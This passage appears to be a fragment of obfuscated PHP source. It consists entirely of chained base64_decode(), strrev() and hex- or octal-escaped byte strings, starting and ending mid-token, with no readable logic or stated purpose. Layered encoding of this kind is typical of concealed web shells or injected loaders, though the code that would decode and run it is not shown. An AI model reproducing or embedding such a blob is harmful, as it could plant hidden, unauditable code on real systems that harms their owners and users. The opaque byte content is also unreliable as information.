4_decode('QswA5nzhM9Li0+0WIjWQCkgUa5DTh5UZeXXURxsX1Ya0vI81zcda7GNcv49IcS0=').base64_decode('0KxutHCgWeQT0cc+H0YVjKk+oYGD6iQxwydEEF+vZZaKXawmKUQbAwDRUg6Im6Y=')."\xe3\x63\x62\xa5\xaf\x5c\xe2\xac\x3c\x76\x95\x9b\x4e\x6\xdb\x5b\x37\x4c\x14\x8e\x2a\x1f\x92\xef\x98\x99\xf2\xc1\x77\x4b\x4e\x2b\x69\x89\x20\x81\xaf\x66\x9b\x97\x2b\x8d\x98\x4b\xb6\x9e\xf2".base64_decode('mgjh0RZfC8V6xB1qVYdkNKuEcmwLYegpdOFCYytYWq8M6dW34kqTam9Cqs5Re1k=').base64_decode('XRVi6Xdcy4xmhBzaIkm37hCfALJSKmF55YnlmMvnYb9992UDydCZT6prFXz3+oM=')."\236\20\162\26\53\12\206\200\66\26\223\324\4\332\240\132\363\52\354\100\123\344\150\40\246\76\167\10\57\237\0\41\256\344\160\42\301\225\22\321\160\153\122\71\71\206\10".base64_decode('k26maJ4UTqyQf0xDcZXNhktpJPEirBpZClmOqPbyxipWSZUru8AFdyN8LKiUYxc=')."\36\156\171\20\360\76\104\272\57\166\32\6\212\211\215\255\4\134\234\152\203\74\205\165\313\360\245\61\230\230\132\31\371\310\374\172\1\254\135\256\172\161\120\54\34\206\22"."\12\256\300\47\361\35\230\174\370\305\22\220\202\360\343\36\171\17\142\172\166\105\74\122\135\272\61\252\33\262\106\112\100\305\306\52\366\165\274\220\75\72\264\226\361\276\351".base64_decode('biE0Xj7QhPnwIay05wp1C2o9ORAWbYeSPC1nlBQ63Y0E+5RnIQPi96mWGFNGcfA=').strrev('I¿»`”vé$™AJŠúçhŒ¶'."\r".'(]ÓùzÖQ°İ<®ğHu9d¥Dœ>z²').strrev('ÔÅà'."\n".'Î-£ÏIˆö\'ÀÚ>w*S€’R(`0a¯âD÷ívw;?à“o±–V Åf“O')."\206\167\54\171\263\340\304\335\306\273\243\214\241\11\15\255\42\200\210\322\22\145\161\162\152\241\3\302\33\201\330\70\330\310\213\165\51\146\103\54\102\27\342\364\212\226\226"."\x50\x8a\x54\x79\xa3\x30\xf2\x57\xe\xb7\x5a\x26\x67\x75\x39\x1f\xe0\x4d\xd4\x4c\x64\x49\x47\x1e\x7a\x69\x13\x97\x6\xca\xc5\x6f\x94\x81\xa4\x3c\x5e\xce\xc3\x3\xf5\x4\xbd\xe3\xd\x5b\x15".base64_decode('BTGFspot6EbAopteAEkIcLjrq5NYMkGpVtpka4FNcrUHARzTRGKnFbBQzaJBwPQ=')."\227\370\64\54\203\126\221\242\104\72\211\130\222\230\250\311\4\130\274\376\303\131\335\301\20\274\313\231\114\13\55\22\112\347\254\34\46\123\137\262\211\224\115\202\140\350\175".base64_decode('E10pK231gUlkdw5UPj7GB9D0SzKzKPATaQIM2I5ZFDFSkEZLUaJQKRUfaNIOhOo=')."\131\302\277\212\201\42\151\41\57\21\156\351\152\12\344\121\12\351\164\44\322\22\262\54\206\76\264\163\130\141\216\200\62\10\323\245\4\303\375\112\33\15\55\74\74\44\214"."\x28\x68\x51\xb8\xe2\x0\x5d\x89\x1\x35\x9b\x8d\xb1\xe3\x20\xf9\xbb\x3c\xa9\xac\xe8\xab\x5c\x10\xb1\x68\xe1\x45\x49\xa1\xca\xc9\x43\xf9\xbc\x38\xf4\xf6\x86\xc7\xcd\x42\x17\x9d\x9c\x49\x86"."\x8c\x9b\xad\x95\x48\x96\xec\x50\xab\x12\x8c\xcb\x1c\x32\x43\xed\x66\xa0\x85\x9\x82\x97\xd1\x76\xd3\xd2\xf1\xb9\x8f\x71\x88\x8d\x98\xd0\xca\x61\xb4\x53\x37\xf7\xe9\x86\x66\xf3\xd\xd7\xb2".base64_decode('K9GO/89sbvkc4LUyHuLgOEk5jM26hly7K9eACtIkMRBkM045LtYnTsqQFo8LH9A=').strrev('ı+kÿßšæıWY0J/4Y2¼i¾aF™ÉÅ¾¹Ğ˜˜Ó¦õec†$CÛÆ}¥b').strrev('Øß§ÃÈåxlŠ>ÚCÖÌy¥x½[ôïĞ=ªĞ™Ã’¦Ec90+àüÿsãì~')."\176\351\241\217\375\52\20\375\340\370\123\256\177\364\346\11\363\217\76\156\375\312\225\17\116\375\324\270\170\170\145\325\257\377\175\334\15\205\155\137\136\132\25\136\166\135\340".strrev('z½¿l_µ­šâıLæœê`zï\'Îy±÷ıÆ‰™Ï"½üé9ÌÇI÷p[»Ô')."\376\212\17\137\332\147\335\361\277\155\234\266\357\45\261\273\232\263\7\37\364\301\21\253\367\332\375\317\153\217\271\156\377\47\67\354\331\363\137\107\315\132\365\356\266\345\331".base64_decode('m3b0/8c3/5yw19A+P/roRx/f9vw+oxval135ve9f8QPlukfXbX28+cCV/oNeXXM=').strrev('ÃË÷Urıg·Ù’íÇv;®îê_[êíÃúÀezÎ¯íè>nŸËøÎUı')."\xbf\xf9\xec\x8e\x37\x36\x7e\x10\xf9\xd9\x6f\xb7\x9e\x3c\xfd\xda\x69\xaf\xed\xbd\xea\xa1\xbf\xf5\x9b\xdd\xa7\x9e\x7a\xd9\x11\xff\xfe\xe3\x93\xd7\x2e\xee\xfb\xf9\xc4\xc0\x3d\xe7\xfe\xe3\xe6"."\333\76\254\375\215\172\310\372\5\157\37\163\323\232\271\47\76\65\363\253\335\232\266\177\261\241\161\303\317\263\133\366\371\350\363\35\73\162\177\272\165\311\274\273\175\377\153".strrev('¾ÎƒúécÁr¼o–KYÛDz¾\'™ß÷}Íå»ô¿7YåçŞÏoäÁş|ï§¶ï†')."\360\243\256\115\103\67\156\172\156\352\266\37\357\166\314\304\67\217\376\360\261\3\367\76\176\113\177\325\254\215\207\56\73\367\244\67\246\66\34\273\362\240\366\263\37\371\355"."\247\67\77\372\302\312\335\217\254\232\141\355\61\157\252\357\331\233\73\6\137\75\174\371\73\147\36\322\177\310\331\7\77\236\236\171\121\355\340\272\127\362\217\34\276\344\212"."\x63\xff\xb1\xfd\xc0\x7b\xea\x6f\x6e\x9c\x96\xee\xdc\x66\x67\xf7\xfc\xc1\x41\x3b\x36\x3e\xb7\xe7\xae\x7b\xc7\xf6\x8f\x4e\xb8\xfd\x98\xfa\xed\x9b\x1b\x9b\xfa\xf2\x75\x1f\x1f\xdc\xff\x40\xfb"."\375\277\337\353\330\243\57\131\235\374\335\125\321\275\363\376\73\7\167\153\75\144\351\251\35\117\377\144\301\313\143\13\367\356\70\350\325\303\146\356\363\322\130\146\337\205\217".strrev('¶ë÷Dú>/‡ö;ï½Éc	ï¼¥ˆãbÜw>ûYõû­6j“Õí°w—ùÕ#2•')."\x3c\x11\x7d\x67\xc7\xb3\x7f\x6d\x2e\x1e\x38\xf8\xa7\x2f\x27\x3c\x70\xde\x21\xef\xdf\xb8\xf4\x8f\x97\xff\xf2\xe0\x7b\x7c\xbd\x1b\x76\xbc\xf3\xf6\xdb\xfb\x3e\x7b\xf6\xdb\xfb\x1e\x55\x7b\x6d"."\xbc\x6d\xb0\x61\x8f\xa9\x97\x3a\x7f\x1b\x7a\xf3\xcb\x8e\xad\xf9\xb5\x8f\xeb\x87\xdc\xf2\xc1\x47\xd6\xb1\x1f\xd5\x2c\xb9\xf1\xd3\x23\x76\x5b\x7d\xe8\xc8\xc1\x1f\x1f\xf2\xaf\x83\xb7\x3c\xf1"."\xe6\x9\x47\x3f\xf4\xdc\x8b\x67\xaf\xbf\xe2\xa1\xcd\x53\xd2\x8b\xef\x78\xf1\x1a\x5f\x5d\xe6\xcd\x7d\x6a\x8e\x5f\x32\xdd\x7f\x5b\xf0\xba\x77\x3b\xbe\x7c\xe8\x7\xca\xc9\xf\x3e\xb5\xc7\x5d".strrev('VÇû/Ó¶Órg¦>¯#çõ~=ßú}­¿+GİğãèşOãs«ô|/R.ÙÛò^wg').base64_decode('X9sH149se6Gm1H1Yw8Hfv+a0qk+O1A9+aPnWCQeumNp44iMHKSev3bfj+uSPbho=')."\234\370\352\341\113\126\334\372\47\163\341\75\235\332\35\353\246\55\272\76\262\275\175\373\147\117\275\173\277\175\331\365\231\277\46\343\137\376\344\357\327\54\372\141\375\244\253"."\xfe\xb2\x2a\x3d\x69\xf6\x75\x6f\x4f\xfa\xd5\x63\xc7\xfa\x97\x1c\xf5\xea\xeb\x87\xfd\xe0\xfa\x33\x6e\xfa\xcd\xa4\xde\xbe\xcb\x7\xa7\x4d\x7a\xae\xff\xb3\xe3\x4f\x5c\xd3\x7a\xcf\x57\x3b\xce".base64_decode('WKjf85etp9719OjWj/23v2wcdOSTB3z/mZodE6877LKoecqJV+x+/FI7+cgP/tw=').base64_decode('dMvTp9/4dLv+x+993jN6aaxrltlwzsGfdf2wxvfshJs+3/utz87JnhjKv/bo400=').strrev('—ïx~Õ—]µé¶ív7ÅúÑiıS®í;.û‰§îEú.‹÷™Ü¾Oü¶ÒYÛ')."\x6f\xfb\xf9\xa3\xad\x6a\xe8\xfe\xdc\xab\xad\x87\xbf\xf3\xcb\xd1\x7d\x66\x7c\xb3\xb2\x65\xdb\xe7\x96\xf6\xea\x67\x5f\xdf\xf4\x97\x8f\x73\x67\x7\xb7\xde\x71\x75\xbe\x7a\xf3\x47\x97\xdd\xb9"."\355\227\153\236\114\76\236\273\353\230\77\176\164\356\247\367\276\362\223\305\123\376\335\63\163\341\372\103\374\77\275\361\244\360\274\7\176\265\360\242\131\55\263\266\274\274\121"."\x6f\xfb\xf8\xb4\xd4\x3d\xcd\xc7\x4e\xb9\xa4\xfa\xd2\x7b\xa6\xfe\xd0\xb9\xfb\xb4\x2d\xa7\xbc\xf7\xe2\xca\xa6\x3d\xf\x9b\x75\xd1\x53\xd9\xa7\xcf\xfa\xfa\x74\x75\xd9\xad\xef\x26\xf\x3c\xf0"."\xad\xdb\x27\xe4\xf6\x7a\x3f\x79\x4b\x7a\x8f\xdd\x5f\xdf\xfb\x1f\xb3\x7a\x1f\x3c\xe0\x82\x7\x66\xfe\x60\xe0\xe0\x75\x27\x5d\x75\xc7\x87\xbb\x3e\xb9\xf6\xc0\xfe\xcf\x33\xf6\x8f\xfd\x47\x9e"."\xbf\x38\xf9\xeb\x9b\x16\xff\x73\xce\xb6\xb9\xc6\xb1\xe6\xa1\x57\x3e\xb2\xf2\xdd\xf7\xbf\xfe\xe5\x11\xa7\xdd\xbd\xfd\xe2\xb3\xff\x7a\xe8\xe4\x67\xfe\xde\xd9\xb4\xf6\xc0\x4b\x47\x3b\x82\x77"."\x9c\xbf\x5f\xf8\x1f\x2f\x15\x3a\xdf\xd8\xb2\xef\xc7\x8f\x9c\x3a\xb8\x7a\x54\x1f\x7b\xe9\x4f\xb7\xcf\xfa\xfb\xa5\x8b\x32\xbd\xb7\xc4\x83\xb9\x9d\xf\xff\x74\xe8\xeb\x9b\x53\x3d\xf\x7d\xfe"."\332\330\333\67\37\365\263\321\317\377\366\321\121\127\156\112\75\74\374\331\347\267\336\165\345\67\163\277\330\365\330\147\73\177\266\145\344\263\267\266\35\364\160\317\45\207\275"."\367\311\45\307\175\371\273\330\332\327\337\172\366\262\237\276\260\355\250\216\253\257\72\363\262\175\76\274\355\254\232\75\337\337\174\354\36\125\77\371\272\56\377\161\366\147\47"."\x1c\xb3\xf1\x8e\x17\xe\xb9\xe3\x83\xf7\xef\x31\x7e\x9c\xde\x6d\xab\xfa\xd2\x92\xf3\xe\xfc\xf5\x63\x5f\x2f\xdd\xfc\x8b\x52\xe8\xc4\xf\x6e\x4b\x5c\xfe\xd6\x59\x8f\xf5\x6f\xb8\xf7\xf2\x93"."\xf7\x7b\xec\xcc\x75\xad\xb7\x5c\xf2\x48\xe4\xc4\xe1\xc7\xff\xfb\x97\xbe\xa3\x27\xdd\x57\xbb\xf8\x6f\x2f\x5e\xf8\xf8\xef\x9f\x7a\x60\xc1\xe4\x8b\x17\x1a\xc1\x81\xb1\x1f\xef\x3c\xfa\xec\x6d"."\177\271\341\246\53\306\266\374\255\365\341\205\63\376\265\365\315\75\256\377\354\336\115\127\117\331\155\166\376\67\347\167\373\237\135\73\353\211\332\343\137\331\324\32\70\170\64".base64_decode('9fCpz55wpV61Nrem/uoLfDNvO//pA69euecpzpqHfrjmq71e+9GiowPHTD9kycI=')."\x5f\xbd\xfe\xe5\x97\x6b\x3e\xd9\xf3\xe5\x89\xc7\x76\x5c\xb3\x36\x3d\xf7\xfd\x4c\x3e\x7b\xd0\x92\xf5\xa7\xec\x6c\x99\xdd\xf6\xca\x2f\xde\xb9\xdf\xff\xb0\xbe\x75\xeb\x98\xfd\xce\xce\xbd\x3"."\xf3\xf6\x79\x64\xdd\x51\x93\x97\xfe\x67\xea\xf9\x47\x7\x1f\x8b\x1f\xf8\xcc\xc0\x27\xdb\x77\xdd\x39\xf3\xc9\x9d\x9f\xdf\xbe\x7c\xd6\xd9\xaf\x6f\x39\xf9\xab\x50\x66\xf3\xd2\x67\xae\x7b\xf5"."\315\301\371\273\26\76\160\327\43\13\127\176\172\167\362\356\265\353\236\16\335\272\354\237\63\254\323\366\74\156\307\256\17\266\254\372\303\265\321\336\165\257\17\255\276\356\276".strrev('^7ãœß±Ë×ù½Ê#Úå8+Á}˜g+‡öòÿıÓó6÷yß;	ì©á¸[')."\xf0\xce\x9\x97\x1f\x76\x5b\xed\xf5\xb7\xed\xfb\xd4\x9a\x3\xfe\x10\x33\xee\xb8\xfc\xf7\xaf\x1f\xb4\x66\xfd\x6d\xf3\xbe\x5f\xfd\xdb\xb5\xd7\x8e\xed\x17\x39\xa1\xb8\x7c\xf3\x1d\x5f\x6e\xbc"."\xe5\x9a\x6d\x9b\xdf\xff\xbd\xf2\xe5\x1e\xd\xe9\xd3\x2e\x31\xe\xe9\xbf\x70\xd5\x7e\xf\xf6\x87\x95\xab\x67\x8d\x74\xee\xdf\x3c\xf1\x89\xda\x2f\xd6\xbc\xff\xc9\x19\xd5\xe9\x97\x96\xff\x64"."\xf6\xdb\xd1\xb9\xd6\x1e\x2d\xd7\x1d\x78\x56\x36\xb3\xfa\xa4\x5b\xfe\xd2\xff\xc5\xd\x85\x7b\x57\xee\x77\xe3\xe9\xff\xbc\x79\x57\xcd\xb5\x17\xff\xa3\x61\x6d\xe9\xef\xb\xf\xdd\x7d\x4e\xf8"."\245\247\254\111\147\74\165\100\303\100\340\260\303\317\130\375\311\147\273\175\157\337\33\336\273\372\375\346\226\374\320\127\103\217\354\157\304\137\373\335\372\375\157\370\164\115\346"."\221\135\157\275\374\332\224\103\356\72\362\326\67\133\57\61\57\372\361\307\167\256\376\370\256\43\237\316\46\326\344\2\271\63\257\377\137\117\235\163\137\264\355\207\317\47\37"."\334\155\357\277\337\147\176\266\344\223\351\273\46\374\356\330\337\35\372\237\107\326\275\165\321\243\177\336\360\364\223\327\354\263\136\175\376\334\337\157\332\157\361\204\363\327\256"."\xd3\x36\x2b\x37\x84\x4e\x7c\xba\xe5\xb2\x7b\x92\x27\xdc\x74\xe5\x39\x6f\x4f\xdf\xfc\xdf\x5d\x8d\xff\xf5\xda\x86\xd7\xdf\x78\xe6\x17\x43\xfa\x67\xa1\x83\x9d\x3f\x3e\xff\xfc\x4b\xbb\x7e\xfa".strrev('ó¾ï5=á¼G9úŞæ|­úæù;·NÔîôw¾ŒßK÷s«w¿½²Ì')."\342\321\143\117\217\135\321\166\161\113\367\322\323\357\174\57\163\305\36\276\314\306\373\152\56\135\75\361\204\347\347\54\314\256\371\350\116\377\1\333\63\153\17\172\373\276\303"."\117\377\350\262\167\37\327\102\237\46\216\177\356\212\7\132\366\370\347\171\177\270\141\151\327\222\160\335\171\351\303\217\273\166\340\255\207\16\250\137\377\347\3\107\137\372\125".strrev('‡áçxï_y™é¶6~V7£õ¹ß¯Á›özªÛÚå<ßöåºâruÿoäßyÄü<')."\277\330\376\302\371\261\153\177\361\315\7\251\67\266\374\373\235\167\136\275\122\75\342\341\125\237\177\271\355\215\67\316\171\370\215\257\77\333\366\342\223\347\77\73\257\341\213"."\247\337\173\166\336\127\377\336\166\315\303\251\257\167\176\364\315\352\257\276\267\351\355\353\67\74\374\354\347\127\37\273\307\347\33\112\326\274\3\26\354\270\160\316\314\327\377"."\173\340\275\7\203\253\36\352\276\375\305\143\136\233\363\364\337\266\274\364\165\350\201\27\376\371\361\336\153\333\266\176\372\356\374\335\232\157\71\41\223\75\365\342\255\257\14".base64_decode('nTvng1VHb4j2fvRCz09v7+p5o6awfurwT32+I8yJl0067g/73LfHs9Zv11ww/aw=')."\xef\x9d\x9f\xbb\xf5\xdf\x87\xfe\x7c\x7f\xff\x8f\x8e\xf9\xe2\xb9\x6b\x9e\xdc\x70\xce\x86\xcd\x4d\x6f\xd7\x6c\xf8\xe6\xb8\xbd\xd6\xd6\x3d\x93\x3e\x9c\xdd\x58\xc8\x17\x86\x72\xc6\x0\xc8\xb6".strrev('òÕXhcôÙŒÚeˆÀÕ%Šú¶ÏG!ì 6™'."\0".')Ìó%€¦SJFVœô ')."\x16\xd8\x80\x4d\x9f\x3e\x13\x38\xf1\x6c\x29\x9d\x1b\x2\xd5\x5a\x7d\x3d\xab\x79\xda\xc\x60\xeb\xd3\x3\xd9\x11\x3\x98\xf0\x59\xd3\xa0\xf6\x59\x33\x21\x5d\x69\x68\x74\xb8\x77\x5\x54\xc8"."\254\255\373\12\3\332\20\60\256\231\376\25\305\234\75\300\362\103\266\251\254\240\154\156\110\357\35\205\326\327\117\201\76\115\237\71\235\65\203\376\32\205\122\321\111\103\65"."\xd3\xeb\xa1\x67\x5a\xbf\x9a\x1b\x1e\x60\x7a\xc0\xec\x8a\x91\x34\x53\x83\xce\x9c\x5\x25\xa5\xcd\x61\x4b\xd5\xfb\x69\x60\xc6\x54\xa8\x75\xc6\x14\x28\xb7\x3f\x6f\xaf\x70\xfa\x40\x51\x32\x7b"."\72\224\133\134\141\244\315\76\326\50\66\320\305\201\341\41\215\31\350\117\147\363\60\23\206\261\236\17\130\61\335\227\31\200\163\351\254\121\314\353\114\365\67\143\12\364\312".base64_decode('HMayAxxMFww1M7oCztgGzWG1f0WGNUPNZUrQjNHhFX3GEOOFZ8JQ91r5TH+O6Zs=')."\214\102\321\356\207\6\116\143\103\311\206\320\54\144\173\373\106\371\370\100\1\3\371\241\301\341\34\214\317\254\72\66\300\200\60\106\336\36\161\240\235\63\147\100\226\151\63"."\41\172\164\40\275\142\304\141\207\352\203\331\176\107\203\236\252\303\116\276\330\13\31\247\326\263\311\204\342\215\254\223\56\62\224\230\311\347\144\6\24\73\143\72\264\170\352".base64_decode('7BkM21hnpkMbhnvzlsNUjfWzAcGn1EMGy1YHV/TDHAzg2zY5huCs8GkzoMwVOac=')."\167\120\3\5\153\375\54\166\125\307\36\111\17\364\62\165\265\61\244\345\30\236\115\141\250\65\175\26\114\275\321\253\352\331\14\214\341\114\266\144\353\147\103\177\112\305\374".base64_decode('ipwJbZ3N0MQYHhrNjzCpSrOL1goQ2JyRQr/KzBGstD481MuOSHQra/SNMElMswY=')."\xd3\x30\xf5\x3\xfd\xa6\x6a\xf\x72\xb3\xfe\xb4\x3e\x98\x87\xd2\xa6\xcc\x86\x56\x16\x6\x46\x6c\x4b\x85\x92\x9c\x15\xf9\xe1\xa1\x41\xa8\x7d\xc0\xcc\xf6\xdb\x43\x16\x5b\x23\x30\x5b\x43\x66"."\xb6\xaf\xc4\xec\x45\xea\xd9\x2c\xf5\xa7\x91\x20\x9e\x5\x9c\x9c\x5a\x37\x9b\xad\x6\x18\x13\xdd\x1a\x1e\xc9\xb2\x13\x88\x52\xbf\x91\x76\xb2\x80\x5\x3\x43\xb9\xec\x88\x96\x66\x93\xce\xc8"."\207\63\244\146\64\60\230\310\233\152\246\64\220\143\355\0\140\377\220\71\72\242\63\264\235\301\326\155\272\157\5\263\61\357\263\63\246\236\207\141\31\112\333\203\132\37\357"."\74\353\214\143\26\62\66\164\146\306\64\230\231\251\214\314\114\257\203\101\132\122\200\61\151\122\63\3\114\371\211\4\132\247\144\173\22\360\53\42\106\240\240\32\334\112\244".strrev(')1™ÎB`à/ ıXËÈZlÜZAzàNÄK°C0­•™a¬Æšå’­‘šZ')."\x85\x5c\xb1\x9\xc7\xb4\xb8\xb9\x4\x35\xc4\xa\xe0\x56\x5\xdc\xfd\xac\x83\x41\xaa\x70\x52\x7\x5a\x51\xdb\x1e\x36\x2d\x81\x43\x99\xbc\x59\xca\xba\x4a\xcd\xa6\x5d\x65\x72\x28\x53\x13\x78".base64_decode('Y3LjwFE5LiNTBnMNUJrMWEoOBNgQp6XZpOpkR7UHAjLYL8fqBmpFPh9w32pLkT8=').strrev('‡ºò4‚Q-Ô±½„¥'."\n".'¥×ÃV²@±(d©]İhëãÀÒÚŞC4–'."\r".'­”æô0')."\x80\x9d\xa3\xec\xda\xf4\xc0\xd8\xc5\xeb\x77\x5c\x71\xc7\x8e\xb\x37\x8e\xdd\xbf\x6e\xd7\xc6\x3b\xc6\xb6\x5c\x81\x82\xdb\x37\x5f\x34\xb6\xf1\xda\x37\xaf\x3e\x7b\xfb\xe6\xb\xb7\x6f\x3e\x7d"."\xd7\xda\xbb\xdf\x7b\xf0\x82\xb1\x8b\x37\xed\x3a\x6b\xcb\xd8\x86\x5b\xc6\x6e\x5c\xbb\xfd\x81\x2d\xbb\x1e\x5e\xbb\xf3\x96\xf3\xb7\x6f\xbe\x7d\xc7\x86\xff\x18\x3b\xfb\xde\xed\xf\xac\x1f\x3b"."\367\272\261\265\27\357\130\167\341\366\55\33\120\372\35\347\212\222\121\262\261\333\257\302\171\37\74\163\154\363\346\135\277\274\205\307\276\367\340\31\100\125\201\143\150\323\34"."\x7c\xcb\x8c\x99\x20\x91\xd1\x51\xe6\x29\x80\x90\x9a\x1d\x50\xba\xf2\x1a\x1a\x61\x85\xdc\x8d\xc4\xf6\x4a\x4e\x9f\x66\x29\xe\xb1\x5b\x52\xd1\x5f\xc3\x34\xfc\x14\xe1\xe8\xd\x3e\x5b\xd1\xd"."\x1c\xad\xb0\xb9\x9\x70\xa4\x4c\x6a\x85\x22\x46\x2d\x18\xa5\x20\xbd\xd4\xe3\xb2\x5c\x96\xf0\xaf\xd2\x30\xd3\x88\xa\x68\x85\xc7\x5a\xcc\x55\xd\xfe\xac\x65\xc4\x76\x48\x53\x72\x2a\x2\x64"."\33\224\34\312\246\60\133\177\305\61\331\167\141\224\117\272\147\21\124\234\126\336\14\66\265\275\134\305\55\364\255\320\60\371\312\50\71\304\50\103\51\262\252\334\44\301\265"."\xde\xdc\xc4\x44\x8e\x72\x8f\x4\x28\x44\xc9\x11\xbb\x4f\xa1\x4d\xf1\x29\xe4\x44\x55\x71\xdf\x4c\xc3\x47\xe6\x6c\x13\x90\xd7\x98\xdc\x7c\x4b\x2b\xe6\xd5\xc\x6f\x7a\x71\xb4\xe2\x20\xca\xad"."\221\217\163\75\135\113\124\30\106\336\71\127\44\132\327\45\247\102\102\171\264\135\307\233\146\163\36\21\72\161\250\107\16\275\105\67\150\120\50\176\121\105\234\116\132\132\126"."\147\166\266\132\201\244\144\106\353\104\335\314\15\174\63\150\11\130\256\123\243\271\363\213\175\105\174\161\331\231\63\37\56\36\302\151\130\112\252\27\276\305\5\13\31\232\367"."\x9e\x44\xf1\x5\xd3\xd2\x24\x5d\xcb\xc5\xc9\x1a\xfc\x7e\xbf\xa4\xb5\xcd\xf3\xc3\x1a\xfc\x5\xc5\x89\x23\x54\x4\xb\xe3\xd5\x3c\x1e\xbc\x85\x9b\x20\xa0\x65\xde\xdb\xab\xd9\x4e\x3\xb9\x6d".base64_decode('pExWUENnBerRB1kQ0wMz0ScZJVjEPYbUKPo5p2SzKwIlI8+g6BMliZcMPG8N7p4=').base64_decode('aEZWyjRHzTiNUm9yMFQB0Ut1sojXssfDcEt9H4YELG+HezZRr/x8gtGkoY0/axM=').base64_decode('a0vYR6BIW7oOGRe4gbOTQfiWrI48kUXEXBjczNLOq+wEz0Ych25oHKtKNj9awCY=')."\311\51\264\103\263\275\14\141\140\52\253\103\144\64\322\224\152\211\200\135\136\250\53\222\112\44\142\322\125\167\162\125\153\161\152\101\254\45\325\34\213\55\210\0\346\300\250"."\66\110\304\15\137\14\22\7\270\70\44\56\10\341\23\14\331\134\112\346\36\360\165\140\274\103\46\24\60\46\104\50\332\334\36\212\163\233\355\351\201\272\100\275\110\213\52"."\x4c\x61\xd3\xf5\x46\x76\x1b\x31\x91\xc\xc5\x2b\x5c\xa\xa7\x97\xc5\x61\xc4\xe1\x82\x38\x64\x68\x8f\x2d\x52\x9a\x63\xd1\xee\x8e\xce\x4\xbd\xb\x4d\xe1\x9d\x31\x29\x9e\x58\xe6\x42\x34\xbb"."\62\136\36\15\305\207\273\242\241\346\260\22\351\114\306\230\351\75\267\225\44\227\56\22\74\314\206\300\262\65\176\45\34\362\323\200\174\61\104\56\221\227\4\70\272\324\127"."\335\123\325\63\251\247\246\247\166\171\240\307\136\26\224\266\33\135\236\36\10\164\265\100\367\32\370\127\326\206\65\327\221\110\234\2\127\210\142\361\120\163\224\65\245\51\224".strrev(''."\0".'¸í7ËÑt>vÆÅÀ»ˆ½åqÜÏÏÇh*!qÿcšó´_÷íÎü¼ì~„sXÏ€')."\x38\x1\x65\xd7\xa6\xff\xda\xbe\xe5\xe1\x9d\x97\xdf\x32\xb6\xf1\xaa\x1d\xeb\xef\xdb\xf9\xf3\x35\x34\xe2\xcd\x5f\xdf\x39\x76\xde\x2d\xbc\x61\xca\x9b\xeb\x1e\xda\x71\xd1\x4d\x9c\xcb\xa0\xcc".strrev('"/xâºmwœìk?®Æ›Eçe¾®Ç/Şv8\\6;ùÏqßNŒyˆÙnwìó~å…')."\321\360\122\66\25\160\240\37\74\255\307\236\124\103\207\267\307\236\214\207\266\26\375\326\140\113\176\364\313\14\222\211\315\352\51\335\341\316\346\260\367\146\214\34\204\373\364"."\223\50\206\120\23\15\140\10\155\270\217\317\302\51\162\325\251\172\334\126\254\202\371\227\32\45\65\246\45\234\150\216\107\232\302\140\53\316\47\152\42\141\211\300\56\0\101"."\23\361\205\374\233\337\2\53\363\177\240\324\60\144\256\125\134\35\121\3\31\63\137\52\30\244\261\112\25\66\65\252\362\341\155\203\134\323\121\252\360\266\207\0\132\6\55"."\275\32\174\107\232\330\242\126\57\251\366\325\371\352\153\25\160\216\100\163\200\113\4\245\12\114\226\171\76\127\45\276\264\53\124\357\253\253\125\252\212\3\125\320\56\61\256"."\250\365\51\232\322\126\124\137\15\64\130\156\256\110\213\310\243\355\130\252\156\70\266\222\361\161\20\317\217\176\135\156\16\62\1\221\203\316\23\112\341\205\51\241\316\26\167".base64_decode('SuodoauamAdmAnR85WmurlXSYIFfIZJkcw1Go2swaiYDnehq4/NNzesVevuKNks=')."\265\331\104\1\224\114\25\206\322\331\142\151\115\324\15\64\71\64\75\372\340\61\330\20\235\227\204\310\21\217\140\63\210\341\174\22\53\304\21\267\25\125\224\155\243\375\54"."\xd8\xbd\x8c\xd4\x81\xbb\x84\x8e\x25\xbc\xf\xc\x97\x15\xc6\x3f\x70\xa7\x17\xf8\x1e\x59\x38\xd9\xdc\x4e\xb1\x3c\x21\xa1\x79\x36\x3d\xd1\x85\xa8\x62\x38\x15\x17\x8a\x70\xde\x1f\xd2\xd1\xe5"."\202\11\302\276\44\135\244\263\65\26\357\240\367\247\22\315\355\341\216\120\0\210\70\305\4\232\36\63\107\112\243\122\215\51\37\5\125\273\206\237\124\304\206\54\111\152\105"."\xeb\x2a\xe5\x20\x4e\x87\x8e\x42\xb1\x17\x1a\x3\xb3\xaf\x90\xcb\xb3\x2a\xc9\xd2\x58\x4d\xef\xa9\x43\x91\xdc\x3b\x4b\x2c\x9e\x4c\xa1\x1\x0\xf2\x2c\x51\xdd\x6a\x69\xb7\x90\xc\x96\xf1\x35"."\240\41\306\264\347\20\223\143\62\165\110\66\315\234\270\240\302\161\231\315\261\316\326\10\273\52\326\2\42\161\61\153\272\22\265\304\43\370\42\64\324\257\260\242\244\13\172"."\50\40\254\20\120\240\70\234\345\337\342\106\60\216\340\173\76\12\210\55\37\5\370\146\203\123\111\336\146\160\375\211\116\376\55\270\123\24\300\26\161\202\372\56\152\341\337"."\355\374\202\47\216\210\305\245\100\50\36\352\110\360\140\174\21\277\201\300\141\364\46\102\252\263\273\103\120\374\150\150\41\102\226\230\140\120\30\265\256\11\114\232\137\333\103"."\x6f\x73\xd1\x4f\xfa\x73\x12\xb\xe1\x1b\x2e\xcb\x56\xd6\xfb\x94\x19\xab\x6b\x21\xd\xbb\xff\x94\x72\xfa\x74\x83\x31\x92\xb8\x96\x53\xa2\xa9\x68\xac\x8d\x86\x89\x17\x9c\xb0\x91\x15\x2\x84".base64_decode('slRBXG1ScLU227r4alAQDiv0iqjSGVsUEo5VpAiACD8rwdOW9gz3BBCzYC8Xt7M=')."\132\232\24\306\206\64\23\1\234\312\351\220\73\304\266\321\345\76\330\61\122\171\263\227\371\130\100\4\221\261\13\364\167\61\373\40\264\22\62\40\251\264\230\147\327\264\350"."\375\260\124\317\252\236\23\173\374\1\172\45\16\63\57\75\76\321\244\124\170\61\332\143\23\11\327\175\276\24\161\25\2\245\243\136\302\27\135\265\64\60\27\176\100\134\232"."\13\354\51\4\347\65\362\311\14\237\262\252\23\375\155\113\256\12\243\277\121\364\23\115\242\351\322\171\2\264\44\243\221\5\341\125\370\37\21\121\313\7\222\136\204\161\147"."\x88\x74\xae\x42\xff\x22\x2\xb3\x2a\xd2\xe9\x2d\xac\x29\x9c\x5c\x14\xe\xd3\x4\xec\x1b\x7e\x45\x52\x44\x70\xa0\xab\x92\x97\x24\x6c\xba\xe\xd1\xc2\x94\x1d\x8a\x4e\xa5\x6a\xc8\x60\xfa\x97"."\115\256\115\245\202\166\67\340\13\277\52\137\123\75\241\